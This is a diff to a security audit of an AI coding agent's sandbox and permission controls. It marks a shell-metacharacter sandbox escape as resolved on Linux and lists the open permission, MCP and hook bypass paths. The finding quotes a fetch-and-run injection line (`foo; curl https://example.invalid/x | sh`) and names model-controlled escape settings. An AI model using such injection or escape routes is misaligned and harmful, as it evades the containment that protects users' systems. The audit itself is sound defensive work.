@@ -30,7 +30,7 @@ engineering estimate for the remediation described in the linked finding.
 
 | Area | Severity | Effort | Current state |
 | --- | --- | --- | --- |
-| Shell sandbox | Open - critical | S (fix-or-remove) | The bwrap wrapper is joined into a string and run under `shell: true`, so any shell metacharacter escapes the sandbox. Declared `filesystem`/network policy is not read at all. |
+| Shell sandbox | Resolved (Linux) | — | Sandboxed commands spawn as a direct argv with `shell: false`, so no host shell parses the command and metacharacters stay inside the namespace. Declared `filesystem` mounts are applied after the workspace bind; `network` domain rules fail closed to `--unshare-net`. Covers foreground Bash, session background shells, and persistent jobs. Remaining scope: no macOS (`sandbox-exec`) or Windows implementation. |
 | Project permission allow-rules | Open - critical | S | `defaultMode: bypassPermissions` is blocked, but project-layer `permissions.allow` concatenates into the resolved allow list and reaches the same outcome. |
 | MCP in headless/SDK flows | Open - critical | S | A fingerprinted approval gate now exists but is wired into the TUI only; headless and SDK entry points connect project servers directly. |
 | Project hooks | Open - critical | M | Project hook entries concatenate into the resolved hook list and execute during lifecycle events. |
@@ -64,40 +64,48 @@ by the operating system.
 Ordered by remediation sequence, not by severity. Findings 1-3 are the containment tier: each is
 small, independently shippable, and closes a currently-open path.
 
-### 1. Sandbox Enforcement Is Bypassed by Any Shell Metacharacter
+### 1. Sandbox Enforcement Is Bypassed by Any Shell Metacharacter — Resolved on Linux
 
-*Owner: TBD — Target: TBD*
+*Resolved 2026-08-18. Retained for history; residual scope tracked below.*
 
-`buildBwrapCmd` assembles its argv into a single string with `parts.join(' ')`
-(`src/sandbox.ts:88`), and `Bash` executes that string via `spawn(effectiveCommand, { shell: true })`
-(`src/tools/shell.ts:132`). The outer shell therefore re-parses the joined string, and everything
-after a `;`, `&&`, `|`, or newline runs **outside** the sandbox in the parent shell. For
-`foo; curl https://example.invalid/x | sh`, only `foo` is confined.
+The original finding: `buildBwrapCmd` assembled its argv into a single string with
+`parts.join(' ')`, and `Bash` executed that string via `spawn(effectiveCommand, { shell: true })`.
+The outer shell re-parsed the joined string, so everything after a `;`, `&&`, `|`, or newline ran
+**outside** the sandbox in the parent shell. For `foo; curl https://example.invalid/x | sh`, only
+`foo` was confined. The `_settings` parameter was unused, so `filesystem` and network keys were
+never read, `--share-net` was unconditional, and — because the command was not passed as a single
+argument — ordinary use was broken too (`/bin/bash -c cat file.txt` bound `file.txt` to `$0`).
 
-Two further defects in the same function:
+Resolution:
 
-- The `_settings` parameter is unused (`src/sandbox.ts:49`). The `filesystem` and network keys in
-  the sandbox schema are never read; `--share-net` is unconditional and the workspace is always
-  mounted read/write.
-- Because the command is not quoted as a single argument, ordinary use is also broken:
-  `/bin/bash -c cat file.txt` binds `file.txt` to `$0`, so `cat` reads stdin instead of the file.
+- `Sandbox.wrap` returns a `CommandExecution` (`{ file, args }`) built by the now-pure
+  `buildSandboxExecution`, and all three spawn sites — foreground `Bash` (`src/tools/shell.ts`),
+  session background shells (`src/jobs/shell-manager.ts`), and the detached persistent runner
+  (`src/job-runner.ts`) — spawn it with `shell: false`. The user command is one argv element
+  handed to `/bin/bash -c` inside the namespace.
+- `filesystem.allowWrite` / `denyWrite` / `denyRead` render as `--bind` / `--ro-bind` / masking
+  `--tmpfs`, applied after the workspace bind so explicit policy wins. Missing sources are skipped.
+- `network` domain rules fail closed to `--unshare-net`, since bubblewrap has no per-domain
+  filtering and granting the full host network would exceed what was declared.
+- The bind is the workspace root, never the `workdir` tool argument. Binding a model-supplied
+  directory last would have shadowed every default mount — `workdir: "/"` returns the whole host
+  filesystem read-write — so a sandboxed command whose `workdir` escapes the workspace is rejected.
+- Added `--die-with-parent`, and fixed a mount ordering bug that shadowed a workspace located under
+  `/tmp` or a system prefix. `--new-session` is deliberately absent: it `setsid()`s the sandbox out
+  of the process group every teardown path signals, so kills would report success and do nothing.
+- `denyRead` masks files with `/dev/null` and directories with a tmpfs; `~` is expanded, and
+  entries that cannot be applied are reported rather than silently skipped.
+- `src/sandbox.test.ts` covers the argv contract without requiring bubblewrap, plus a Linux
+  integration case asserting that a write reached through `;` does not appear on the host while an
+  in-workspace write does.
 
-The third point is the important signal. A control this broken would fail on the first real
-invocation, which indicates the sandbox has no meaningful test coverage and is likely unused. Treat
-this as a fix-or-remove decision, not only a hardening task: a non-functional control that is
-documented in `README.md` is worse than no control, because users rely on it.
+Residual scope, tracked in `MILESTONES.md`:
 
-Required remediation:
-
-- Decide explicitly whether to fix or withdraw the sandbox. If withdrawn, remove it from
-  `README.md` and settings, and make `sandbox.enabled` a hard startup error rather than a warning.
-- If fixed: execute bubblewrap with structured argv and `shell: false`, passing the user command as
-  one argument.
-- Enforce read/write/deny mounts and a defined network policy from the settings actually passed in.
-- Remove model-controlled sandbox escape paths, or require an independent approval.
-- Define fail-closed behavior on Windows/macOS until a supported backend exists. Windows currently
-  warns and continues unsandboxed unless `failIfUnavailable` is set.
-- Add Linux integration tests for shell metacharacters, filesystem boundaries, and networking.
+- No macOS (`sandbox-exec`) or Windows backend. Both still warn and continue unsandboxed unless
+  `failIfUnavailable` is set; that fail-closed switch remains the only containment on those
+  platforms.
+- Model-controlled escape paths (`sandbox.excludedCommands`, `allowUnsandboxedCommands`) are
+  unchanged and still bypass the sandbox without independent approval.
 
 ### 2. Project-Layer Permission Allow-Rules Reach the Blocked Outcome
 
